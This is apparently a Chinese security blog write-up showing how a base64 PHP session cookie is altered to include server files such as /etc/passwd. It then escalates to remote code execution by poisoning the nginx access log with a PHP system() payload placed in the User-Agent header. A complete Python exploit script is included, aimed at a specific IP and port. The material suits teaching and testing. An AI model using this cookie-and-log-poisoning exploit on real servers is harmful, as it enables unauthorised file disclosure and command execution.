#  由本地文件包含所引起的RCE   
Facundo  迪哥讲事   2023-11-23 19:52  
  
## 发现端倪  
  
在某个网络应用程序上进行长达数小时的信息收集及‘侦查’后，发现一处Cookie有些异常。  
> PHPSESSID — PHPSESSID Cookie是PHP原生的，它使网站能够存储序列化的状态数据。它用于建立用户会话并通过临时cookie传递状态数据，通常称为会话cookie（在关闭浏览器时过期）。通常以Base64编码。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4D02zFpnnUfPPb2Pl50wrbafHtQMXA0icLnMh7Xv4mKa6vKzlxoNhgeb8vLicciaLFicWvSB5PU0SZ3w/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4D02zFpnnUfPPb2Pl50wrbC3noicq981QJenU229Xjubhhxj6FRIb9yK6lPeRibcYyWxEsS0XI4vjA/640?wx_fmt=png&from=appmsg "")  
  
  
提示：尽量尝试解码一切可以解码的东西  
  
可以使用在线网站，如base64decode.org进行解码：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4D02zFpnnUfPPb2Pl50wrbIhWXoEgPQlPRwCDCHJicLSK8whpL6ibrsPKvTUzlcO3jK379gkHhb7Iw/640?wx_fmt=png&from=appmsg "")  
  
也可通过Python解码：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4D02zFpnnUfPPb2Pl50wrb5WPrXVcoFia9XPVGkbrHBxAkG7GofOIvqhLUIV9P1u6iaVZibbiaKCl4PQ/640?wx_fmt=png&from=appmsg "")  
  
为什么s=15？那是因为/www/index.html  
 的长度刚好是15  
## LFI漏洞  
  
什么是LFI？  
> Local File Inclusion(本地文件包含)是一种攻击技术，攻击者可以欺骗Web应用程序在Web服务器上运行或暴露文件。LFI攻击可能会暴露敏感信息，在严重的情况下，它们可能会导致跨站点脚本（XSS）和远程代码执行。  
  
  
如果用/etc/passwd替换/www/index.html后会发生什么？  
  
  
  
通过python将修改后的Cookie发送，看看结果：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4D02zFpnnUfPPb2Pl50wrbfkgHBUlpaOnTxMHlTq6m7OB6Kt2R1DkxibUUyKtd6VAdvBjS2H9WyKg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4D02zFpnnUfPPb2Pl50wrbib2rbQzYpYecqbhvuibyNDMPpxXjSZPdTBMWYwk0IovgGd2ZfcamznEw/640?wx_fmt=png&from=appmsg "")  
  
也可以通过Burp来修改Cookie：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4D02zFpnnUfPPb2Pl50wrbI1dMtBtypmN1xnanp2wUzFLoQiaO9WoN4icHyu0QnFLBwFHBggbEFzcA/640?wx_fmt=png&from=appmsg "")  
  
  
  
还有一种方式是更改网站上的cookie:  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4D02zFpnnUfPPb2Pl50wrbUzgia1ZamM4To6QWzZBVibL80VVicCfy3j0S87FNtYgjkXHcAV4EgfYNw/640?wx_fmt=png&from=appmsg "")  
## 从LFI升级至RCE  
> 远程代码执行（RCE）攻击允许攻击者在计算机上远程执行恶意代码。RCE漏洞的影响范围可以从恶意软件执行到攻击者获得对受害机器的完全控制。  
  
  
从LFI漏洞升级到RCE的最简单方法是日志‘投毒’  
> 日志投毒或日志注入是一种允许攻击者篡改日志文件内容的技术，例如将恶意代码插入服务器日志以远程执行命令或反弹Shell。只有当应用程序存在LFI漏洞时，它才有效。  
  
  
在本案例中由于无法获取反弹Shell，因此只能尝试使用 "ls -lsa"-"ls -l" 列出目录。  
  
LFI漏洞只允许读取/执行文件，而无法写入或创建新文件，那么我们要如何注入呢？可以考虑把日志添加到服务器文件中。  
  
下面主要思路就是将日志添加到服务器文件中  
  
首先，我们需要知道服务器是哪种类型：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4D02zFpnnUfPPb2Pl50wrbdTY6ibKINxMkbQJVhqNa7ibYhICyiacfTDekibOZbaGIu98OUBN7Cm5RUg/640?wx_fmt=png&from=appmsg "")  
  
Nginx！那么日志一般会存放于/var/log/nginx/access.log  
  
同样使用使用Python脚本来尝试访问日志文件：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4D02zFpnnUfPPb2Pl50wrbOdvhpia2iaqfdsicyegrm9svzXS7wAbp9NCxdBC8uoOGYQgU8x8VJZeFQ/640?wx_fmt=png&from=appmsg "")  
  
  
很好！那么让我们看看是否可以通过使用“User-Agent”来添加日志。  
  
在python脚本中，添加如下内容：  
```
headers = {'User-Agent': 'Facundo Fernandez'}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4D02zFpnnUfPPb2Pl50wrb0zqdo4OcVmic0EvAwXcuBtE4c1C1xppdWum9iahmBpJQkHI60iahsRXnw/640?wx_fmt=png&from=appmsg "")  
  
在日志中发现如下信息:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4D02zFpnnUfPPb2Pl50wrbZWGwVsjW1VWAsibgxM3dZ8wMscWetn4ibYIYbToCAmNMDLjNR13qUicSw/640?wx_fmt=png&from=appmsg "")  
  
尝试改成：  
```
headers = {'User-Agent': "<?php system('ls -lsa');?>"
```  
  
发现代码成功执行！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4D02zFpnnUfPPb2Pl50wrbV25YGgcJ4Abtj9aW4iaADI2nMmSsYVnuJbPVUPu1PUSpCicPibyVibZGyA/640?wx_fmt=png&from=appmsg "")  
  
完整代码如下:  
```
import base64
# Importing the base64 module, which is used for encoding and decoding base64 data.

# Creating a byte string that mimics a serialized PHP object.
# This could be used to exploit object injection vulnerabilities in PHP applications.
malicious_cookie = b'O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}'
print('Malicious Cookie:', malicious_cookie)
# Printing the created malicious byte string (cookie) for demonstration.

# Encoding the malicious cookie using base64.
# This is necessary because cookies are usually base64-encoded during HTTP communication.
malicious_cookie_encoded = base64.b64encode(malicious_cookie)
print('Malicious cookie encoded:', malicious_cookie_encoded)
# Printing the base64-encoded version of the malicious cookie.

# Our Target
# This should be a URL under your control or where you have permission to test.
url = 'http://142.93.32.153:31043'

# Creating a cookies dictionary with the 'PHPSESSID' as the key and the encoded malicious cookie as the value.
cookies = {'PHPSESSID': malicious_cookie_encoded.decode()}

# Creating a headers dictionary, attempting to pass PHP code in the User-Agent header.
# The intention here is to test for Remote Code Execution (RCE) by trying to get the server to execute the 'ls' command.
headers = {'User-Agent': "<?php system('ls -lsa');?>"} 

# Sending a GET request to the specified URL with the malicious cookies and headers.
r = requests.get(url, cookies=cookies, headers=headers)
print(r.text)
# Printing the response text from the server.
# If the server is vulnerable and executes the code, you might see the result of the 'ls -lsa' command in the response.
```  
  
如果你是一个长期主义者，欢迎加入我的知识星球([优先查看这个链接，里面可能还有优惠券](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247489122&idx=1&sn=a022eae85e06e46d769c60b2f608f2b8&chksm=e8a61c01dfd195170a090bce3e27dffdc123af1ca06d196aa1c7fe623a8957755f0cc67fe004&scene=21#wechat_redirect)  
)，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
## 往期回顾  
  
  
[xss研究笔记](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487130&idx=1&sn=e20bb0ee083d058c74b5a806c8a581b3&chksm=e8a604f9dfd18defaeb9306b89226dd3a5b776ce4fc194a699a317b29a95efd2098f386d7adb&scene=21#wechat_redirect)  
  
  
[SSRF研究笔记](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486912&idx=1&sn=8704ce12dedf32923c6af49f1b139470&chksm=e8a607a3dfd18eb5abc302a40da024dbd6ada779267e31c20a0fe7bbc75a5947f19ba43db9c7&scene=21#wechat_redirect)  
  
  
[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)  
  
  
[2022年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
[](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
  
  
[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
## 福利视频  
  
笔者自己录制的一套php视频教程(适合0基础的),感兴趣的童鞋可以看看,基础视频总共约200多集,目前已经录制完毕,后续还有更多视频出品  
  
https://space.bilibili.com/177546377/channel/seriesdetail?sid=2949374  
## 技术交流  
  
技术交流请加笔者微信:richardo1o1 (暗号:growing)  
  
  
